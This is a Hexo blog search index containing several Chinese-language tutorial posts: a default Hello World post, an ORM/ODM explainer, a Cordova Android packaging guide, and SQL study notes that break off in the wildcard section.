<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2018/02/20/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>
]]></content>
      <categories>
        <category>others</category>
      </categories>
      <tags>
        <tag>others</tag>
      </tags>
  </entry>
  <entry>
    <title>ORM与ODM</title>
    <url>/2020/05/03/ORM%E4%B8%8EODM/</url>
    <content><![CDATA[<h2 id="ORM"><a href="#ORM" class="headerlink" title="ORM"></a>ORM</h2><p>ORM是Object-Relational-Mapping的缩写。即通过面向对象的语法，完成关系型数据库的操作，这样的对象-关系映射模型就是ORM。通常ORM是作为MVC架构中的Model层。</p>
<p>ORM使用对象封装了数据库操作，不用书写SQL语言。开发者只要面向对象编程，通过数据对象交互，不用关心底层数据库。</p>
<p>ORM优点：</p>
<ul>
<li><p>数据模型在一个地方定义，易于更新与维护。</p>
</li>
<li><p>ORM有现成的工具，很多功能可以自动完成，如数据预处理、事务等。</p>
</li>
<li><p>迫使你使用MVC架构，ORM是天然的Model。</p>
</li>
<li><p>基于ORM的业务代码简单，代码量少，语义性好，易理解。</p>
</li>
<li><p>不必编写性能不佳的SQL语句。</p>
</li>
</ul>
<p>ORM缺点：</p>
<ul>
<li><p>ORM库通常都不是轻量级工具，是有一定学习曲线的。</p>
</li>
<li><p>对于复杂查询，ORM要么无法表达，要么性能不如原生SQL。</p>
</li>
<li><p>ORM抽象了数据库层，开发者无法了解底层的数据库操作，也无法定制一些特殊SQL。</p>
</li>
</ul>
<h2 id="ODM"><a href="#ODM" class="headerlink" title="ODM"></a>ODM</h2><p>ORM对应的是关系型数据库，如MySQL，那么ODM就对应的是文档型数据库，如MongoDB。ODM是Object-Document-Mapping缩写，即对象文档映射。MongoDB对应Node的ODM库是Mongoose。</p>
]]></content>
      <categories>
        <category>软件工程</category>
      </categories>
      <tags>
        <tag>ORM</tag>
        <tag>ODM</tag>
      </tags>
  </entry>
  <entry>
    <title>cordova安装与打包androidApp基础教程</title>
    <url>/2019/06/03/cordova%E5%AE%89%E8%A3%85%E4%B8%8E%E6%89%93%E5%8C%85androidApp%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="前置环境-nodeJS-v10-16-0，node-版本最好不要低于-v8-0-0"><a href="#前置环境-nodeJS-v10-16-0，node-版本最好不要低于-v8-0-0" class="headerlink" title="前置环境 nodeJS v10.16.0，node 版本最好不要低于 v8.0.0"></a>前置环境 nodeJS v10.16.0，node 版本最好不要低于 v8.0.0</h2><h2 id="安装-cordova"><a href="#安装-cordova" class="headerlink" title="安装 cordova"></a>安装 cordova</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">npm</span> <span class="token function">install</span> -g cordova
<span class="token comment"># 若安装过慢，请使用淘宝镜像</span>
<span class="token function">npm</span> <span class="token function">install</span> -g cordova --registry<span class="token operator">=</span>https://registry.npm.taobao.org<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="创建新的-cordova-项目"><a href="#创建新的-cordova-项目" class="headerlink" title="创建新的 cordova 项目"></a>创建新的 cordova 项目</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># testApp为目录名path</span>
<span class="token comment"># test.example.com为项目id</span>
<span class="token comment"># testApp为项目名name</span>
cordova create testApp test.example.com testApp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="../images/cordova1.png" alt="image.png"></p>
<p>发送使用信息选 No</p>
<span id="more"></span>

<h2 id="为项目加入-android-平台"><a href="#为项目加入-android-平台" class="headerlink" title="为项目加入 android 平台"></a>为项目加入 android 平台</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 进入刚刚新建的项目路径</span>
<span class="token builtin class-name">cd</span> testApp
<span class="token comment"># 增加android平台</span>
cordova platform <span class="token function">add</span> android
<span class="token comment"># 查看已安装平台</span>
cordova platform <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="../images/cordova2.png" alt="image.png"></p>
<h2 id="安装-android-平台前置环境"><a href="#安装-android-平台前置环境" class="headerlink" title="安装 android 平台前置环境"></a>安装 android 平台前置环境</h2><p>1.安装 jdk8（jdk-8u91)，安装完成后配置环境变量</p>
<p><img src="../images/cordova3.png" alt="image.png"></p>
<p>2.安装 gradle，解压 gradle.zip 到 C:\Gradle，然后将 gradle-5.4.1\bin 添加到环境变量</p>
<p><img src="../images/cordova4.png" alt="image.png"></p>
<p>3.安装 android studio，安装好后新建项目如下图</p>
<p><img src="../images/cordova5.png" alt="image.png"></p>
<p><img src="../images/cordova6.png" alt="image.png"></p>
<p><img src="../images/cordova7.png" alt="image.png"></p>
<p>4.等待所有配置自动安装下载完成后，打开 Tools，点击 SDK Manager 配置 android 版本，钩选 android6-android9 的版本，下载安装</p>
<p><img src="../images/cordova8.png" alt="image.png"></p>
<p><img src="../images/cordova9.png" alt="image.png"></p>
<p>至此，前置环境配置完成</p>
<p>所有前置环境安装完成后，就可以打包 App 了</p>
<h2 id="前端文件的准备"><a href="#前端文件的准备" class="headerlink" title="前端文件的准备"></a>前端文件的准备</h2><ol>
<li>如果是原生的 js 文件，没有使用框架，可以直接放入 cordova 项目的 www 目录中，如 testApp 下的 www 文件夹</li>
<li>如果使用了 vue 框架，则需要修改 router.js 中 mode 为 hash，vue.config.js 中 publicPath 为”./“，再进行打包，将打包后 dist 文件夹中的文件放入 www 文件目录中</li>
</ol>
<h2 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h2><p>开始打包，cd 进入之前的 testApp 目录，执行打包</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">cd</span> testApp
cordova build<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>等待命令行执行完成后，就可以在 testApp/platforms/android/app/build/outputs/debug/找到名为 app-debug.apk 的安装包文件了。</p>
<h2 id="真机模拟"><a href="#真机模拟" class="headerlink" title="真机模拟"></a>真机模拟</h2><p>如果要在打包后直接模拟手机查看效果，则需要开启 BIOS 设置中的 Intel VT-x 虚拟选项。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 不用执行cordova build，直接执行模拟器命令，即可在打包完后直接模拟手机。</span>
cordova emulate android<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="修改-App-名称与图标"><a href="#修改-App-名称与图标" class="headerlink" title="修改 App 名称与图标"></a>修改 App 名称与图标</h2><p>在 testApp 目录下修改 config.xml，name 为 App 名称，与新建项目 create 命令的 name 一致，默认没有 icon 标签，需自行添加，再使用正确的图片路径即可。</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>testApp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>icon</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./reverse.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>cordova</category>
      </categories>
      <tags>
        <tag>android</tag>
        <tag>app</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL学习笔记</title>
    <url>/2019/07/18/SQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>SQL 是 Structured Query Language 的缩写。SQL 不是某个特定数据库供应商专有的语言。几乎所有重要的 DMBMS 都支持 SQL。标准 SQL 由 ANSI 标准委员会管理，称为 ANSI SQL。所有主要的 DBMS 即使有自己的扩展，也都支持 ANSI SQL。</p>
<h3 id="发音"><a href="#发音" class="headerlink" title="发音"></a>发音</h3><ol>
<li><p>S-Q-L</p>
</li>
<li><p>see·kwl</p>
</li>
</ol>
<h3 id="数据库-database：保存有组织数据的容器"><a href="#数据库-database：保存有组织数据的容器" class="headerlink" title="数据库 database：保存有组织数据的容器"></a>数据库 database：保存有组织数据的容器</h3><p>人们常用数据库这个术语来代表他们使用的数据库软件，这是不正确的。数据库软件应称为数据库管理系统（DBMS），数据库是通过 DBMS 创建和操纵的容器。</p>
<h3 id="表-table：一种用于存储特定类型数据的结构化的文件"><a href="#表-table：一种用于存储特定类型数据的结构化的文件" class="headerlink" title="表 table：一种用于存储特定类型数据的结构化的文件"></a>表 table：一种用于存储特定类型数据的结构化的文件</h3><p>表名是唯一的，用来标识表本身。</p>
<h3 id="模式-schema：关于数据库和表的布局及特性的信息"><a href="#模式-schema：关于数据库和表的布局及特性的信息" class="headerlink" title="模式 schema：关于数据库和表的布局及特性的信息"></a>模式 schema：关于数据库和表的布局及特性的信息</h3><p>模式定义了数据在表中如何存储以及数据库中表的关系，也包括对特定表的描述。</p>
<h3 id="列-column：表中的一个字段"><a href="#列-column：表中的一个字段" class="headerlink" title="列 column：表中的一个字段"></a>列 column：表中的一个字段</h3><p>所有表都是由一个或多个列组成。</p>
<h3 id="数据类型-datatype：定义了列可以存储哪些数据种类，每个列都有相应的数据类型"><a href="#数据类型-datatype：定义了列可以存储哪些数据种类，每个列都有相应的数据类型" class="headerlink" title="数据类型 datatype：定义了列可以存储哪些数据种类，每个列都有相应的数据类型"></a>数据类型 datatype：定义了列可以存储哪些数据种类，每个列都有相应的数据类型</h3><p>数据类型及其名称是 SQL 不兼容的一个主要原因。</p>
<p>注意：<strong>字符串类型值在 SQL 中都使用单引号’’</strong></p>
<h3 id="行-row：表中的一个记录-record"><a href="#行-row：表中的一个记录-record" class="headerlink" title="行 row：表中的一个记录 record"></a>行 row：表中的一个记录 record</h3><h3 id="主键-primary-key：能够唯一标识表中每一行的列或一组列"><a href="#主键-primary-key：能够唯一标识表中每一行的列或一组列" class="headerlink" title="主键 primary key：能够唯一标识表中每一行的列或一组列"></a>主键 primary key：能够唯一标识表中每一行的列或一组列</h3><p>每个表都应该具有一个主键，以便后续的数据操作与管理。</p>
<p>表中任何列都可以做为主键，只要满足下列条件：</p>
<ol>
<li>任意两行都不具有相同的主键值；</li>
<li>每一行都必须具有一个主键值（主键列不允许 NULL 值）；</li>
<li><strong>主键列中的值不允许修改或更新</strong>；</li>
<li><strong>主键值不能重用（如果某行从表中删除，它的主键不能不能赋给以后的新行）</strong>。</li>
</ol>
<p>在使用多列做为主键时，上述条件必须应用到所有列，所有列值的组合必须是唯一的（但是单个列的值可以不唯一）。</p>
<span id="more"></span>

<h2 id="SELECT-语句"><a href="#SELECT-语句" class="headerlink" title="SELECT 语句"></a>SELECT 语句</h2><p>关键字 keyword 是 SQL 保留字，不能用作表或列的名字。</p>
<h3 id="检索单列"><a href="#检索单列" class="headerlink" title="检索单列"></a>检索单列</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1 <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注意：</p>
<ol>
<li><p>没有明确排序查询结果，则返回的数据没有特定的顺序。</p>
</li>
<li><p>多条 SQL 语句必须以分号(;)分隔，虽然多数 DBMS 不需要加分号，但加上分号是更好的做法。</p>
</li>
<li><p>SQL 语句不区分大小写，但对 SQL 关键字大写可以提升代码可读性。</p>
</li>
<li><p>在处理 SQL 语句时，所有的换行都会被忽略。多数 SQL 开发人员认为，将 SQL 语句分成多行更易阅读和调试。</p>
</li>
</ol>
<h3 id="检索多列"><a href="#检索多列" class="headerlink" title="检索多列"></a>检索多列</h3><p>在 SELECT 关键字后给出多个列名，列名间以逗号分隔，最后一列的列名后不可加逗号。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column3 <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="检索所有列"><a href="#检索所有列" class="headerlink" title="检索所有列"></a>检索所有列</h3><p>在列名位置使用星号(*)通配符可以检索所有列。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="DISTINCT-关键字"><a href="#DISTINCT-关键字" class="headerlink" title="DISTINCT 关键字"></a>DISTINCT 关键字</h3><p>SELECT 关键字返回该列所有值，当有重复值但我们只想检索不同的值时，可以使用 DISTINCT 关键字。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">DISTINCT</span> column1 <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注意：</p>
<ol>
<li><p>DISTINCT 关键字必需放在列名前面；</p>
</li>
<li><p>DISTINCT 作用于所有列，而不是 DISTINCT 后的第一列，多列使用 DISTINCT 时，只有多列的值全都相同时才会被当作相同值舍弃，哪怕有一列的值不同，都会做为不同值返回。因此如果多列中有一列是主键，那么必然会返回所有行的数据，与不使用 DISTINCT 关键字得到的结果一致。</p>
</li>
</ol>
<h3 id="限制检索结果"><a href="#限制检索结果" class="headerlink" title="限制检索结果"></a>限制检索结果</h3><p>要返回一定数量的行，不同的 DBMS 对 SQL 的实现不同。</p>
<p>SQL Server 和 Access 中使用 TOP 关键字决定返回多少行。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">TOP</span> <span class="token number">5</span> column1 <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>DB2</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1 <span class="token keyword">FROM</span> table1 <span class="token keyword">FETCH</span> <span class="token keyword">FIRST</span> <span class="token number">5</span> <span class="token keyword">ROWS</span> ONLY<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Oracle，基于 ROWNUM 计算行</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> ROWNUM <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>MySQL、MariaDB、PostgreSQL、SQLite，使用 LIMIT 子句</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1 <span class="token keyword">FROM</span> table1 <span class="token keyword">LIMIT</span> <span class="token number">5</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>OFFSET 关键字指定了起始行，下面的代码表示显示从第三行起的五行数据</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1 <span class="token keyword">FROM</span> table1 <span class="token keyword">LIMIT</span> <span class="token number">5</span> <span class="token keyword">OFFSET</span> <span class="token number">3</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注意：</p>
<ol>
<li><p>起始行为第 0 行，而不是第一行；</p>
</li>
<li><p>MySQL、MariaDB、SQLite 支持简化写法，LIMIT 5 OFFSET 3 可以写成 LIMIT 5,3;</p>
</li>
</ol>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>行内注释：– 或 #，多行注释：/* */</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 行内注释1</span>
<span class="token comment"># 行内注释2，尽量不使用，支持这种形式注释的DBMS很少。</span>
<span class="token comment">/*
 多
 行
 注
 释
 */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="排序，ORDER-BY-子句"><a href="#排序，ORDER-BY-子句" class="headerlink" title="排序，ORDER BY 子句"></a>排序，ORDER BY 子句</h2><p>若不明确指定排序顺序，则不应该假定检索出的数据顺序有任何意义</p>
<p>SQL 语句由子句构成，有些子句是必需的，有些则是可选的。一个子句通常由关键字加上所提供的数据组成。</p>
<p>ORDER BY 子句取一列或多列的名字，据此对输出排序。</p>
<p>注意：</p>
<ol>
<li><p>ORDER BY 子句应该是 SELECT 语句中最后一条子句；</p>
</li>
<li><p>用非检索列排序数据是完全合法的；</p>
</li>
<li><p>按多列排序，用逗号分隔所有列名即可，排序完全按照多列的书写顺序进行。即先按 ORDER BY 子句第一列排序，有相同值时按第二列排序，若按第一列排序后都是唯一值，则不会按后面的列排序。</p>
</li>
</ol>
<p>我们还可以按 SELECT 出的列表中列的位置排序，当列名不在 SELECT 出的列表中时，则不能使用此方法，但必要情况下，可以混合使用列名与列的位置排序。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 按SELECT出的第二列、第三列及column1排序</span>
<span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column3 <span class="token keyword">FROM</span> table1 <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> column1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>指定排序方向，默认为升序方向（关键字为 ASC 或 ASCENDING）。通过 DESC 关键字（DESC 是 DESCENDING 的缩写，两个都可用）指定降序排序，DESC 关键字只应用在直接位于其前方的列名，若要在多个列上进行降序排序，必须对每一列都指定 DESC 关键字。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2 <span class="token keyword">FROM</span> table1 <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column1 <span class="token keyword">DESC</span><span class="token punctuation">,</span> <span class="token keyword">column</span> <span class="token number">2</span> <span class="token keyword">DESC</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>排序是否区分大小写则取决于数据库设置方式</p>
<h2 id="过滤数据，WHERE-子句"><a href="#过滤数据，WHERE-子句" class="headerlink" title="过滤数据，WHERE 子句"></a>过滤数据，WHERE 子句</h2><p>SQL 过滤与应用过滤。数据既能在数据库中过滤，也可以在应用层过滤，若在应用层中过滤，则 SELECT 语句检索出超出实际需求的数据，客户端对返回的数据循环判断，提取出需要的行。通常情况下，应用层过滤是不可取的，首先应用层过滤影响应用性能，且使创建的应用不具备可伸缩性；其次发送冗余的数据给客户端会占用额外的带宽。因此尽可能在数据库层面去过滤数据。</p>
<h3 id="WHERE-子句操作符"><a href="#WHERE-子句操作符" class="headerlink" title="WHERE 子句操作符"></a>WHERE 子句操作符</h3><table>
<thead>
<tr>
<th>操作符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>=</td>
<td>等于</td>
</tr>
<tr>
<td>&lt;&gt;</td>
<td>不等于</td>
</tr>
<tr>
<td>!=</td>
<td>不等于</td>
</tr>
<tr>
<td>&lt;</td>
<td>小于</td>
</tr>
<tr>
<td>&lt;=</td>
<td>小于等于</td>
</tr>
<tr>
<td>!&lt;</td>
<td>不小于</td>
</tr>
<tr>
<td>&gt;</td>
<td>大于</td>
</tr>
<tr>
<td>&gt;=</td>
<td>大于等于</td>
</tr>
<tr>
<td>!&gt;</td>
<td>不大于</td>
</tr>
<tr>
<td>BETWEEN</td>
<td>在指定的两个值之间</td>
</tr>
<tr>
<td>IS NULL</td>
<td>为 NULL 值</td>
</tr>
</tbody></table>
<p>表中列出的操作符是冗余的，并非所有 DBMS 都支持全部这些操作符，具体请参阅 DBMS 的文档。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column1 <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">;</span>
<span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column2 <span class="token operator">!=</span> <span class="token string">'foo'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>使用 BETWEEN 关键字时，必须指定两个值，两个值必须用 AND 关键字分隔。注意，BETWEEN 匹配范围中所有值，<strong>包括两个边界值</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column1 <span class="token operator">BETWEEN</span> <span class="token number">5</span> <span class="token operator">AND</span> <span class="token number">10</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>空值检查：创建表时，表设计人员可以指定其中的列能否不包含值。当一个列下某行不包含值时，称为包含空值 NULL。注意：NULL 与字段包含数字 0，空字符串’’，或空格’ ‘不同。判断值是否为 NULL 不能简单检查= NULL，而要使用 WHERE 字句的 IS NULL 子句。这将返回所有包含 NULL 值的行。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column1 <span class="token operator">IS</span> <span class="token boolean">NULL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注意：通过过滤选择不包含指定值的所有行时，可能希望返回含 NULL 值的行，但是无法做到。因为未知值有特殊含义，数据库无法知晓是否匹配，所以进行过滤时不会返回这些结果。</p>
<h2 id="高级过滤"><a href="#高级过滤" class="headerlink" title="高级过滤"></a>高级过滤</h2><p>逻辑操作符：用来联结或改变 WHERE 子句的关键字。</p>
<h3 id="组合-WHERE-子句"><a href="#组合-WHERE-子句" class="headerlink" title="组合 WHERE 子句"></a>组合 WHERE 子句</h3><p>SQL 允许给出多个 WHERE 子句，以 AND 子句或 OR 子句联结。AND 表示与，用来表示检索满足所有给定条件的行；OR 表示或，用来表示检索匹配任一给定条件的行。通常情况下，许多 DBMS 在 OR 子句第一个条件得到满足的情况下，就不再计算第二个条件了。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 检索column1为'foo'且column2小于等于10的行</span>
<span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column1 <span class="token operator">=</span> <span class="token string">'foo'</span> <span class="token operator">AND</span> column2 <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">;</span>
<span class="token comment">-- 检索column1为'foo'或column2小于等于10的行；注意：这会检索出column1为foo但column2大于10的行，因为第一条件满足时，第二条件被短路了</span>
<span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column1 <span class="token operator">=</span> <span class="token string">'foo'</span> <span class="token operator">OR</span> column2 <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>求值顺序</p>
<p>AND 操作符在求值过程中优先级更高，因此需要改变操作符优先级时应该使用圆括号对操作符进行明确分组。尽可能使用括号进行分组，依赖默认的求值顺序可读性较差，易造成歧义。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 若要选取column2大于10且column1为'foo'或为'bar'的行时，下面这种写法是错误的，这会选出所有column1为'foo'的行，或column1为'bar'且column2大于10的行</span>
<span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column1 <span class="token operator">=</span> <span class="token string">'foo'</span> <span class="token operator">OR</span> column1 <span class="token operator">=</span> <span class="token string">'bar'</span> <span class="token operator">AND</span> column2 <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">;</span>
<span class="token comment">-- 正确写法应使用括号分组</span>
<span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> <span class="token punctuation">(</span>column1 <span class="token operator">=</span> <span class="token string">'foo'</span> <span class="token operator">OR</span> column1 <span class="token operator">=</span> <span class="token string">'bar'</span><span class="token punctuation">)</span> <span class="token operator">AND</span> column2 <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="IN-操作符"><a href="#IN-操作符" class="headerlink" title="IN 操作符"></a>IN 操作符</h3><p>IN 操作符用来指定条件范围，范围中每个条件都可以进行匹配。IN 取一组由逗号分隔、括在圆括号中的合法值。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column1 <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">)</span> <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注意：IN 操作符与 OR 操作符有相同的功能，IN 操作符语法更清晰，<strong>IN 操作符一般要比 OR 操作符执行得更快</strong>，IN 最大的优点是可以包含其他 SELECT 语句，能更动态地建立 WHERE 子句，后面会讲到。</p>
<h3 id="NOT-操作符"><a href="#NOT-操作符" class="headerlink" title="NOT 操作符"></a>NOT 操作符</h3><p>WHERE 子句中用来否定其后所跟条件的关键字，NOT 关键字从不单独使用。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> <span class="token operator">NOT</span> column1 <span class="token operator">=</span> <span class="token string">'foo'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>简单的 WHERE 子句，使用 NOT 没有什么优势，复杂子句中则很有用，如与 IN 操作符联用，NOT 就可以找出所有非匹配的行。</p>
<p>注意：MariaDB 支持使用 NOT 否定 IN、BETWEEN 和 EXISTS 子句。大多数 DBMS 允许使用 NOT 否定任何条件。</p>
<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><p>通配符（wildcard）：用来匹配值的一部分的特殊字符</p>
<p>搜索模式（search pattern）：由字面值、通配符或两者组合构成的搜索条件。</p>
<p>为了在搜索子句中使用通配符，必须使用 LIKE 操作符。LIKE 告诉 DBMS，后面跟的搜索模式利用通配符匹配而不是相等匹配。严格来说，LIKE 是谓词（predicate），而不是操作符。</p>
<p>注意：通配符搜索只能用于字符串类型，非文本数据类型字段不能使用通配符搜索。</p>
<h3 id="百分号（-）通配符"><a href="#百分号（-）通配符" class="headerlink" title="百分号（%）通配符"></a>百分号（%）通配符</h3><p>百分号表示任意字符出现任意次数</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 找到column1列所有以Foo开头的值</span>
